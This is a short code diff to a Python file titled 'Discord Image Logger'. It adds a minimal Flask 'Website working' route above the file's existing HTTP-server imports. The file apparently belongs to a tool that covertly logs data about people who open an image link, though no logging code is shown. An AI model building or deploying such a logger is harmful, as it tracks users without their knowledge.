@@ -1,5 +1,12 @@
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
+from flask import Flask
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    return "Website working"
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
